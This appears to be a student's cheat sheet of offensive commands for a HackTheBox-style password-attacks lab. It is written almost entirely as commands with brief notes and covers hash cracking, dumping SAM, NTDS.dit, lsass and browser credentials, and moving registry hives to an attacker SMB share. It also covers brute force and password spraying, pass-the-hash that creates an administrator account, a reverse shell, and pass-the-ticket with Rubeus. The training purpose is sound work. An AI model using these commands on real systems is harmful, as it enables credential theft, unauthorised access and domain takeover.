### John the ripper
```
$ john --single passwd
r0lf:$6$ues25dIanlctrWxg$nZHVz2z4kCy1760Ee28M1xtHdGoy0C2cYzZ8l2sVa1kIa8K9gAcdBP.GI6ng/qA4oaMrgElZ1Cb9OeXO4Fvy3/:0:0:Rolf Sebastian:/home/r0lf:/bin/bash
```
%% if we ran into a file that has saved the passwd with hashes (output shown below command), the command generates a list of hashes based on the info and runs them against the hash until it finds one that matches%%

```
$ john --wordlist=<wordlist_file> <hash_file>
```
%%  can use the --rule option at the end to add rules e.g numbers, capitalizing letters or adding special characters %%

```
$ john --incremental <hash_file>
$ grep '# Incremental modes' -A 100 /etc/john/john.conf
```
%% instead of using a wordlist, use incremental mode. This uses predefined incremental modes specified in its configuration file (john.conf), which define character sets and password lengths. You can customize these or define your own to target passwords that use special characters or specific patterns. %%

```
$ hashid -j 193069ceb0461e1d40d216e32c79c704
```
%% using hashid command to identify hash type %%

### Hashcat
```
$ hashcat -a 0 -m 0 <hashes> [wordlist, rule, mask, ...]
```
%% -a is used to specify the attack mode,  -m is used to specify the hash type, etc %%

```
$ hashid -m '$1$FNr44XZC$wQxY6HHLrgrGX0e1195k.1'
```
%% hashid -m to identify hashcat hash type %%

```
$ hashcat -a 0 -m 0 e3e3ec5831ad5e7288241960e5d4fdb8 /usr/share/wordlists/rockyou.txt
```
%% -a 0 represents a dictionary attack which uses wordlist as input and -m 0 is the identified hash type in this case MD5 %%

```
$ hashcat -a 0 -m 0 1b0556a75770563578569ae21392630c /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```
%% you can add a ruleset with -r whichi modifies the password on top of wordlist %%

```
$ hashcat -a 3 -m 0 1e293d6912d074c0fd15844d803400dd '?u?l?l?l?l?d?s'
```
%% Mask attack(-a 3) is a type of brute-force attack in which the keyspace is explicitly defined by the user. For example, if we know that a password is eight characters long, rather than attempting every possible combination, we might define a mask that tests combinations of six letters followed by two numbers by using characters at the end %%

```
$ cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
$ wc -l inlane.wordlist
```
%% use CeWL to scan potential words from a company's website and save them in a separate list., -d represents the depth to spider, -m minimum length of the word, storage of found words in lowercase --lowercase and -w for file where we want to store the results. %%

```
$ hashcat --stdout -a 1 markwhitepass.txt markwhitepass.txt > combined_wordlist.txt
```
%% using hashcat to create a combined wordlist with 2 wordlist inputs %%

```
$ awk 'length >= 12' combined_wordlist.txt > mark_wordlist.txt
```
%% create a wordlist with at least 12 characters %%

```
$ hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
```
%% hashcat create a wordlist based on a custom rule %%

### SSH Keys
```
$ grep -rnE '^\-{5}BEGIN [A-Z0-9]+ PRIVATE KEY\-{5}$' /* 2>/dev/null
```
%% search for values that begin with '-----BEGIN [...SNIP...] PRIVATE KEY-----' %%

```
$ ssh-keygen -yf ~/.ssh/id_ed25519 
```
%%  how to tell if an SSH key is encrypted or not with ssh-keygen %%

```
$ ssh2john.py SSH.private > ssh.hash
$ john --wordlist=rockyou.txt ssh.hash
```
%%  using Python script ssh2john.py to acquire the corresponding hash for an encrypted SSH key, and then use JtR to try and crack it %%

```
$ john ssh.hash --show
```
%% view resulting hash %%

```
$ office2john.py Protected.docx > protected-docx.hash
$ john --wordlist=rockyou.txt protected-docx.hash
$ john protected-docx.hash --show
$ pdf2john.py PDF.pdf > pdf.hash
$ john --wordlist=rockyou.txt pdf.hash
$ john pdf.hash --show
```
%% crack password-protected word and pdf docs %%

```
$ curl -s https://fileinfo.com/filetypes/compressed | html2text | awk '{print tolower($1)}' | grep "\." | tee -a compressed_ext.txt
```
%%  get extension list %%

```
$ zip2john ZIP.zip > zip.hash
$ cat zip.hash 
$ john --wordlist=rockyou.txt zip.hash
```
%% cracking an encrypted zip file then use JtR to crack with desired password list %%

```
$ bitlocker2john -i Backup.vhd > backup.hashes
$ grep "bitlocker\$0" backup.hashes > backup.hash
$ cat backup.hash
$ hashcat -a 0 -m 22100 'bitlockerhash' /usr/share/wordlists/rockyou.txt
```
%% bitlocker2john to crack bitlocker encrypted drive and hashcat or JtR to crack the hash %%

```
$ sudo apt-get install dislocker
$ sudo mkdir -p /media/bitlocker
$ sudo mkdir -p /media/bitlockermount
```
%% install dislocker to mount BitLocker-encrypted drives in Linux and create 2 folders to mount the VHD %%

```
$ sudo losetup -f -P Backup.vhd
$ sudo dislocker /dev/loop0p2 -u1234qwer -- /media/bitlocker
$ sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount
```
%% We then use losetup to configure the VHD as loop device, decrypt the drive using dislocker, and finally mount the decrypted volume %%

```
$ cd /media/bitlockermount/
$ ls -la
$ sudo umount /media/bitlockermount
$ sudo umount /media/bitlocker
```
%% analyse files on the mounted vhd file then once finished unmount %%

### Network Services
```
$ netexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
```
%% nxc command %%

```
$ evil-winrm -i <target-IP> -u <username> -p <password>
$ evil-winrm -i 10.129.42.197 -u user -p password
```
%%  evil-winrm command %%

```
$ hydra -L user.list -P password.list ssh://10.129.42.197
$ hydra -L user.list -P password.list rdp://10.129.42.197
$ hydra -L user.list -P password.list smb://10.129.42.197
```
%% using hydra to bruteforce with username and password list %%

```
$ netexec smb 10.129.42.197 -u "user" -p "password" --shares
$ smbclient -U user \\\\10.129.42.197\\SHARENAME
```
%% netexec to list shares and smbclient to access share %%

### Spraying, Stuffing and Defaults

```
$ netexec smb 10.100.38.0/24 -u <usernames.list> -p 'ChangeMe123!'
```
%% password spraying %%

```
$ hydra -C user_pass.list ssh://10.100.38.23
```
%% credential stuffing where you use username and password combination to brute force a service %%

```
$ pip3 install defaultcreds-cheat-sheet
$ creds search linksys
```
%% once installed, we can use creds command to search for known default creds associated with a specific product or vendor %%

### Attacking SAM, SYSTEM, and SECURITY
```
$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/
```
%% start SMB server on attack machine to transfer hklm\security, hklm\system, hklm\sam %%

```
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save
C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save
C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save
```
%% save copies of registry hives locally %%

```
C:\> move sam.save \\10.10.15.16\CompData
C:\> move security.save \\10.10.15.16\CompData
C:\> move system.save \\10.10.15.16\CompData
```
%% move registry hives to smb server hosted on attack machine %%

```
$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```
%% specify each of the hive files and do a secrets dump %%

```
$ sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
$ hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt
```
%% once we have the hashes we can start cracking them, use 1000 for crack NTLM-based hashes and 2100 is for DCC2 hashes which are harder to crack%%

```
C:\Users\Public> mimikatz.exe
mimikatz # dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
```
%% DPAPI encrypted credentials can be decrypted manually with tools like Impacket's dpapi, mimikatz %%

```
$ netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
$ netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```
%% dumping lsa and sam secrets remotely respectively %%

```
$ pypykatz lsa minidump /home/peter/Documents/lsass.dmp
```
%% extract credentials from lsass dump file %%


### Attacking Windows Credential Manager
```
C:\Users\sadams>cmdkey /list
C:\Users\sadams>runas /savecred /user:SRV01\mcharles cmd
```
%% cmdkey to enumerate credentials stored in current user's profile and runas to impersonate stored user %%

```
C:\Users\Administrator\Desktop> mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::credman
```
%% dump credentials from memory using the sekurlsa module %%

```
$ msconfig.exe
```
%% if you get a user who is part of the local administrators group, you can run msconfig.exe and run an elevated cmd shell %%

```
$ ./kerbrute_linux_amd64 userenum --dc 10.129.201.57 --domain inlanefreight.local names.txt
```
%% checking names against domain using kerbrute to get valid domain accounts %%

```
*Evil-WinRM* PS C:\> net localgroup
*Evil-WinRM* PS C:\> net user bwilliamson
```
%% check what group a user belongs to we can use net localgroup command and net user command to check what privileges our user has %%

```
*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:
```
%% create a shadow copy of the C: drive where NTDS will be stored %%

```
*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
*Evil-WinRM* PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData 
```
%% copy ntds.dit to our attack machine that is hosting the SMB server %%

```
$ impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```
%% use impacket-secretsdump to dump all the hashes from NTDS.dit %%

```
$ netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil
```
%% nxc shortcut to dump NTDS.dit %%

```
$ evil-winrm -i 10.129.201.57 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
```
%% if we can't crack the hash we can use pass the hash to login as that user %%

### Credential hunting in windows
```
C:\> start LaZagne.exe all
```
%% download LaZagne to your windows host and run this command to search for credentials %%

```
C:\> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```
%% use findstr command to search for credentials in windows host %%

### Cracking Linux Credentials
```
$ sudo cp /etc/passwd /tmp/passwd.bak 
$ sudo cp /etc/shadow /tmp/shadow.bak 
$ unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
$ hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
```
%% once we have root access on a linux machine we can use unshadow then hashcat to crack the hashes stored on /etc/shadow%%

### Credential Hunting in Linux
```
$ for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```
%% search for configuration files %%

```
$ for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
```
%% scan directly for each file found with the specified file extension and output the contents. In this example, we search for three words (user, password, pass) in each file with the file extension .cnf.%%

```
$ for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
```
%% searching for databases %%

```
$ find /home/* -type f -name "*.txt" -o ! -name "*.*"
```
%% search for notes %%

```
$ for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
```
%% search for scripts %%

```
$ tail -n5 /home/*/.bash*
```
%% enumerating history files e.g .bash_history%%

```
$ for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
```
%% strings to find content in the logs %%

```
$ ls -l .mozilla/firefox/ | grep default 
$ cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq 
$ python3.9 firefox_decrypt.py
```
%% firefox decrypt command to decrypt any passwords found in mozilla firefox %%


```
$ python3 laZagne.py browsers
```
%% LaZagne can also return results if the user has used the supported browser. %%

### Credential Hunting in Network Traffic

| Wireshark filter                                | Description                                                                                                                                                                          |
| ----------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| ip.addr == 56.48.210.13                         | Filters packets with a specific IP address                                                                                                                                           |
| tcp.port == 80                                  | Filters packets by port (HTTP in this case).                                                                                                                                         |
| http                                            | Filters for HTTP traffic.                                                                                                                                                            |
| dns                                             | Filters DNS traffic, which is useful to monitor domain name resolution.                                                                                                              |
| tcp.flags.syn == 1 && tcp.flags.ack == 0        | Filters SYN packets (used in TCP handshakes), useful for detecting scanning or connection attempts.                                                                                  |
| icmp                                            | Filters ICMP packets (used for Ping), which can be useful for reconnaissance or network issues.                                                                                      |
| http.request.method == "POST"                   | Filters for HTTP POST requests. In the case that POST requests are sent over unencrypted HTTP, it may be the case that passwords or other sensitive information is contained within. |
| tcp.stream eq 53                                | Filters for a specific TCP stream. Helps track a conversation between two hosts.                                                                                                     |
| eth.addr == 00:11:22:33:44:55                   | Filters packets from/to a specific MAC address.                                                                                                                                      |
| ip.src == 192.168.24.3 && ip.dst == 56.48.210.3 | Filters traffic between two specific IP addresses. Helps track communication between specific hosts.                                                                                 |

```
$ ./Pcredz -f demo.pcapng -t -v
```
%% pcredz to extract credentials from live traffic or network packet captures %%

### Credential Hunting in Network Shares
```
c:\Users\Public>Snaffler.exe -s
```
%% snaffler identifies  accessible network shares and searches for interesting files %%

```
PS C:\Users\Public\PowerHuntShares> Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public
```
%% does not need to be domain-joined %%

```
$ docker run --rm -v ./manspider:/root/.manspider blacklanternsecurity/manspider 10.129.234.121 -c 'passw' -u 'mendres' -p 'Inlanefreight2025!'
```
%%  A basic scan for files containing the string passw , you don't need access to a domain-joined computer %%

```
$ nxc smb 10.129.234.121 -u mendres -p 'Inlanefreight2025!' --spider IT --content --pattern "passw"
```
%% A basic scan of network shares for files containing the string "passw" %%

```
$ nxc smb 10.129.235.120 -u mendres -p 'Inlanefreight2025!' -M spider_plus -o DOWNLOAD_FLAG=true --smb-timeout 60 
```
%% download share contents %%

```
$ smbclient //10.129.235.120/IT -U 'INLANEFREIGHT\mendres%Inlanefreight2025!' -c 'get Tools/split_tunnel.txt split_tunnel.txt'
```
%% using smbclient to download a file directly %%

```
$ nxc smb 10.129.235.120 -u mendres -p 'Inlanefreight2025!' --share IT --get-file Tools/split_tunnel.txt /tmp/split_tunnel.txt
```
%% using nxc to get a specific file for a host %%

```
$ grep -ri "passw" .
```
%% look for passwords in the current directory %%

### Pass the Hash (PtH)
```
c:\tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
```
%%  /user reps the user name we want to impersonate;  /NTLM reps the hash of the user's password; /domain the user belongs to; /run is the program we want to run with user's context %%

```
PS c:\htb> cd C:\tools\Invoke-TheHash\
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
```
%% Target reps hostname or IP address of the target; Username  is Username to use for authentication; Domain is Domain to use for authentication. This parameter is unnecessary with local accounts or when using the @domain after the username;  Hash is NTLM password hash for authentication. This function will accept either LM:NTLM or NTLM format; Command  is Command to execute on the target. If a command is not specified, the function will check to see if the username and hash have access to WMI on the target. %%

```
PS C:\tools> .\nc.exe -lvnp 8001
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e <rev_shell_generator>
```
%% result is a rev shell connection from DC01 host (172.16.1.10)%%

```
$ impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```
%% pass the hash with psexec %%

```
# netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
```
%% pass the hash with nxc with -x for command execution %%

```
$ evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```
%% pass the hash with evil-winrm %%

```
c:\tools> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```
%% Enable Restricted Admin Mode to allow PtH on rdp %%


### Pass the Ticket (PtT) from Windows
```
c:\tools> mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
```
%% export all kerberos tickets if you get access to a local machine, you have to be local administrator. The tickets that end with $ correspond to the computer account, which needs a ticket to interact with the Active Directory. User tickets have the user's name, followed by an @ that separates the service name and the domain %%

```
c:\tools> Rubeus.exe dump /nowrap
```
%% export all tickets using rubeus, add the nowrap for easier copy-paste and dump to dump all tickets. The ticket will be encoded in Base64 format %%

```
c:\tools> mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::ekeys
```
%% pass the key approach converts a hash/key for a domain-joined user into a full Ticket Granting Ticket (TGT), use ekeys cmd to enumerate all key types present for kerberos package %%

```
mimikatz # sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
c:\tools> Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
```
%% pass the key attack that opens a cmd.exe window in context of the user and you can request any service on behalf of that user. First command is using mimikatz and second is using rubeus. the second command uses asktgt which asks for the tgt for that user%%

```
c:\tools> Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
```
%% same as pass the key but add /ptt to pass the ticket to current logon session %%

```
c:\tools> Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
PS c:\tools> [Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
c:\tools> Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/...SNIP...
```
%% ptt attack for .kirbi imported from disk, we can also convert the .kirbi to base64 format and use that to do a pass the ticket attack %%

```
mimikatz # kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
```
%% ptt attack but using mimikatz %%